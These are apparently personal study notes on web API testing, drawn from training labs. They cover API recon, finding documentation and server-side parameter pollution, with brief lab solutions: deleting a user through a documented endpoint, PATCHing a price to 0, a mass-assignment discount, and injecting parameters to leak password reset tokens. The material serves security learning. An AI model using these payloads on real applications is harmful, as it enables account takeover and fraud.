
All dynamic websites are composed of API so classic web vulns like SQLI  could be classed as API testing 

## API recon

if you see a `get api/books` then probably this results in an interaction to retrieve a list of books from a library hence we can try `api/books/mystery` 


## API documentation

API usually documented so that developers know how to use and integrate them  most machine readable documentation is desiged to be processed by software for automatin tasks like API integration and validation



### Discovering API documentation

use burp scanner to crawl the app 

-   `/api/swagger/v1/users/123` 

- check `?wsdl`

# Server-side parameter pollution

some systems contain API that arent directly accessible from the internet. SSP occure when a website embeds user input in a server side request to an internal API without encoding  meaning that the attacker may be able to manipulate or inject params  example
 - override existing params
 - modify app behaviour
 - access unauth data
### DETECT

find an endpoint that enables you to search for other users based username 
``/userSearch?name=peter&back=/home``

we can url encode # to attempt to truncate the server side request. 
``GET /userSearch?name=peter%23foo&back=/home``

then the front-end will try to access this
``GET /users/search?name=peter#foo&publicProfile=true``
if the response is invalid name then the app is treated as foo meaning that the server may not have been replaced


we can  URL encode & to attempt to add a second param to the server side request  ``GET /users/search?name=peter&foo=xyz&publicProfile=true``






# Lab: Exploiting an API endpoint using documentation


after changing the email we had an API
`/api/users/wiener``

remove the users and wiener leave only /api we had a documentation

`DELETE /api/user/carlos `


# Lab: Finding and exploiting an unused API endpoint

saw the URL GET /api/products/1/price
discovered PATCH is allowed by responding an error 
```json
{
"price":0
}

```


# Lab: Exploiting a mass assignment vulnerability

```json
{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":2,"item_price":133700}]}
```



# Lab: Exploiting server-side parameter pollution in a query string


`%26field=reset_token` 

in the JS forget passwrord we can see a reset token with the url /forget-pass?reset-token=1111




# Lab: Exploiting server-side parameter pollution in a REST URL

`../../v1/users/administrator/field/passwordResetToken%23`

note that using # may bypass certain input validation since it may trick validation layer that it is a separate  or new param

